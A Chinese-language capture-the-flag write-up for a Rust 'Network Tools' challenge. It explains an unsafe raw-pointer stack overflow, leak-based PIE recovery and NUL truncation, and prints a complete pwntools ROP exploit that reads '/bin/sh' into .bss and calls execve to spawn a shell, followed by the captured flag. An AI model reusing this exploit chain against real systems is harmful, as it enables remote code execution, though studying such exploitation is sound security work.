# Network Tools

## 题目简述

这是一个 Rust 编写的网络工具菜单。程序启动时打印全局变量 `CHOICE` 的地址，选项 3 的域名查询函数则包含手写的不安全读取：

```rust
fn ip_lookup() {
    let mut input: [u8; 400] = [0; 400];
    let size = read(&mut input, 0x400);
    // ...
}
```

目标缓冲区只有 400 字节，即 `0x190`，但 `read` 最多写入 `0x400` 字节，并通过裸指针绕过 Rust 的边界检查，形成栈溢出。二进制启用了 PIE 和 NX，程序给出的地址泄露用于恢复 PIE 基址。

## 解题过程

启动信息泄露的是 `&CHOICE`。该符号在题目二进制中的偏移为 `0x7a03c`，因此：

```python
io.recvuntil(b"leaked: ")
choice = int(io.recvline(), 16)
elf.address = choice - 0x7a03c
```

手写 `read` 还有一个细节：写入结束后，它从缓冲区起点一直扫描到 NUL，再把这一段转换为 UTF-8 字符串并交给 DNS 查询。若整个溢出串都被当成字符串，ROP 地址很可能导致 UTF-8 转换异常。官方 payload 以 `b"abcd\x00"` 开头，使域名在第一个 NUL 处结束；NUL 后的数据仍会覆盖栈，但不会参与字符串解析。

从缓冲区起点到保存的返回地址偏移为 `0x2e8`。恢复 PIE 基址后，可完全使用主程序中的 gadget 和 `syscall` 导入完成两阶段 ROP：

1. 调用 `syscall(SYS_read, 0, bss, 0x100)`，把 `/bin/sh\x00` 读入可写的 `.bss`。
2. 调用 `syscall(SYS_execve, bss, 0, 0)`，启动 shell。

官方脚本利用 `syscall` 的 GOT 表项取得函数地址，关键链条可概括为：

```python
pop_rax = elf.address + 0x1a4b8
pop_rdi = elf.address + 0x56ea1
pop_rsi = elf.address + 0x4b2a5
pop_rdx_add_rax_al = elf.address + 0x20bb3
pop_rcx = elf.address + 0x4d58e
syscall_got = elf.address + 0x79968
mov_rax_ptr_rdi = elf.address + 0x1c010
call_rax_add_rsp_8 = elf.address + 0x9014
bss = elf.address + 0x7a800

payload = b"abcd\x00".ljust(0x2e8, b"A") + flat(
    # syscall(SYS_read, 0, bss, 0x100)
    pop_rsi, 0,
    pop_rax, elf.address + 0x7aa00,
    pop_rdx_add_rax_al, bss,
    pop_rcx, 0x100,
    pop_rdi, syscall_got,
    mov_rax_ptr_rdi,
    pop_rdi, 0,
    call_rax_add_rsp_8, 0,

    # syscall(SYS_execve, bss, 0, 0)
    pop_rsi, bss,
    pop_rax, elf.address + 0x7aa00,
    pop_rdx_add_rax_al, 0,
    pop_rcx, 0,
    pop_rdi, syscall_got,
    mov_rax_ptr_rdi,
    pop_rdi, 0x3b,
    call_rax_add_rsp_8, 0,
)

io.sendlineafter(b"> ", b"3")
io.sendlineafter(b"Hostname: ", payload)
io.send(b"/bin/sh\x00")
io.interactive()
```

取得 shell 后读取到：

```text
SEKAI{g0_g0_g0_th4t's_h0w_th3_c4rg0_bl0w_4c6cfa1707c99bd5105dd8f16590bece}
```

## 方法总结

Rust 本身不会保护显式 `unsafe` 裸指针代码；调用者传入的切片长度也无法约束一个自行偏移并写入的指针。本题的完整链条是“全局地址泄露恢复 PIE → 超长裸指针写造成栈溢出 → NUL 截断保证 UTF-8 路径不崩溃 → ROP 调用读入与 `execve`”。所有 gadget 偏移都绑定于题目提供的二进制，换编译版本后必须重新确认。
